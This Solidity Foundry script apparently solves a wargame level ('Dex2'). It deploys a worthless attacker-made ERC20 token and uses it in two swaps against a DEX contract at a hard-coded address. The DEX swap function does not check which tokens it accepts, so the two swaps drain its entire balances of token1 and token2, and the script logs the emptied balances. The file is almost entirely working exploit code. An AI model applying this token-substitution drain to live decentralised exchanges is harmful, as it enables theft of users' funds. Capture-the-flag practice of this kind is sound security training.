// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {HackERC20Contract} from "../src/Dex2.sol";

interface Dex2 {
    function token1() external returns (address);
    function token2() external returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Dex2ScriptContract is Script {
    function run() external {
        vm.startBroadcast();
        address levelContractAddress = 0x85C1B1C94737bC55E5D67bfCE2Df85780E0d3a9c;

        HackERC20Contract hec = new HackERC20Contract();
        hec.approve(levelContractAddress, 1 ether);

        Dex2 dex = Dex2(levelContractAddress);
        // step1 : transfer 100 hack token to dex , and swap 100 token1 out by using those 100 hack token (before swap : token1 - 100 , hack token - 100)
        hec.transfer(levelContractAddress, 100);
        dex.swap(address(hec), dex.token1(), 100);

        // step2 : swap 100 token2 out by using 200 hack token  (before swap : token2 - 100 , hack token - 200 )
        dex.swap(address(hec), dex.token2(), 200);

        uint256 balance1 = dex.balanceOf(dex.token1(), levelContractAddress);
        uint256 balance2 = dex.balanceOf(dex.token2(), levelContractAddress);

        console.log("balance1 left : ", balance1);
        console.log("balance2 left : ", balance2);

        vm.stopBroadcast();
    }
}
